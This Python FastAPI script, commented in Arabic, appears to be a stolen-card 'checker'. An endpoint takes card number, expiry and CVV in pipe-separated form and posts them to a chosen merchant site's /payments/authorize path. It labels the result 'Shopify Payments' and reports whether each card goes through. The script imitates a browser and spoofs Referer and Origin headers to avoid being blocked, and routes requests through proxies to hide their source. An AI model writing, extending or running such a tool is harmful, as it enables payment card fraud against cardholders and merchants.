from fastapi import FastAPI, Query
import httpx
import json

app = FastAPI()

# Headers احترافية لضمان عدم حظر الطلبات
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive"
}

@app.post("/check")
async def check_card(
    cc: str = Query(...),
    site: str = Query(...),
    proxy: str = Query(None),
    amount: str = "31.0"
):
    try:
        # التأكد من وجود بروتوكول في الرابط
        if not site.startswith("http"):
            site = f"https://{site}"
            
        # إضافة Referer و Origin ديناميكياً بناءً على الموقع
        request_headers = HEADERS.copy()
        request_headers["Referer"] = f"{site}/"
        request_headers["Origin"] = site

        # تقسيم بيانات البطاقة والتأكد من صحتها
        cc_parts = cc.split('|')
        if len(cc_parts) != 4:
            return {
                "Gateway": "Shopify Payments",
                "Price": amount,
                "Proxy": "Live" if proxy else "None",
                "Response": "INVALID_CC_FORMAT",
                "Status": "false",
                "CC": cc
            }

        # تجهيز بيانات البطاقة للإرسال
        payload = {
            "card_number": cc_parts[0],
            "exp_month": cc_parts[1],
            "exp_year": cc_parts[2],
            "cvv": cc_parts[3],
            "amount": amount
        }

        # إعداد البروكسي بالطريقة الصحيحة لنسخ httpx الحديثة
        proxy_url = None
        if proxy:
            proxy_url = proxy if "://" in proxy else f"http://{proxy}"
            
        transport = httpx.AsyncHTTPTransport(proxy=proxy_url) if proxy_url else None

        # استخدام transport بدلاً من proxies
        async with httpx.AsyncClient(transport=transport, headers=request_headers, timeout=30.0, follow_redirects=True) as client:
            
            target_url = f"{site}/payments/authorize"
            
            # تنفيذ الطلب الحقيقي
            response = await client.post(target_url, json=payload)
            
            # محاولة قراءة الرد كـ JSON، وإن فشل نقرأ النص العادي
            try:
                data = response.json()
                response_msg = data.get("message", data.get("error", "Processed"))
            except Exception:
                response_msg = response.text[:50] # نأخذ أول 50 حرف لتجنب الردود الطويلة جداً
            
            return {
                "Gateway": "Shopify Payments",
                "Price": amount,
                "Proxy": "Live" if proxy else "None",
                "Response": response_msg,
                "Status": "true" if response.status_code == 200 else "false",
                "CC": cc
            }

    except Exception as e:
        return {
            "Gateway": "Shopify Payments",
            "Price": amount,
            "Proxy": "Error",
            "Response": f"Error: {str(e)}",
            "Status": "false",
            "CC": cc
        }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
